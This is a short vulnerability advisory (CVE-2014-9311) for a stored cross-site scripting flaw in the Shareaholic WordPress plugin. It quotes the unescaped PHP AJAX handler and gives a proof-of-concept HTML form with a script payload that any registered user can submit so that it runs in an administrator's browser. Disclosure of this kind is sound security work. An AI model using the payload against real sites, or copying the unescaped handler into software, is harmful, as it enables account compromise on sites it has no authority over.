# Date: 10-11-2014
# Exploit Author: Kacper Szurek
# Contact: http://twitter.com/KacperSzurek
# Website: http://security.szurek.pl/
# CVE: CVE-2014-9311
# Category: webapps
 
1. Description
 
ShareaholicAdmin::add_location is accessible for every registered user.
 
File: shareaholic\shareaholic.php
 
add_action(&#039;wp_ajax_shareaholic_add_location&#039;,  array(&#039;ShareaholicAdmin&#039;, &#039;add_location&#039;));
 
 
$_POST[&#039;location&#039;] is not escaped.
 
File: shareaholic\admin.php
 
public static function add_location() {
    $location = $_POST[&#039;location&#039;];
    $app_name = $location[&#039;app_name&#039;];
    ShareaholicUtilities::update_options(array(
      &#039;location_name_ids&#039; => array(
        $app_name => array(
          $location[&#039;name&#039;] => $location[&#039;id&#039;]
        ),
      ),
      $app_name => array(
        $location[&#039;name&#039;] => &#039;on&#039;
      )
    ));
 
    echo json_encode(array(
      &#039;status&#039; => "successfully created a new {$location[&#039;app_name&#039;]} location",
      &#039;id&#039; => $location[&#039;id&#039;]
    ));
 
    die();
}
 
http://security.szurek.pl/shareaholic-7603-xss.html
 
2. Proof of Concept
 
Login as regular user (created using wp-login.php?action=register) then:
 
    <input type="hidden" name="action" value="shareaholic_add_location">
    <input type="hidden" name="location[app_name]" value="recommendations">
    <input type="hidden" name="location[name]" value="post_below_content">
    XSS: <input type="text" name="location[id]" value="&#039;><script>alert(String.fromCharCode(88,83,83));</script>">
    <input type="submit" value="Hack!">
</form>
 
XSS will be visible for admin:
 
   
3. Solution:
   
Update to version 7.6.1.0

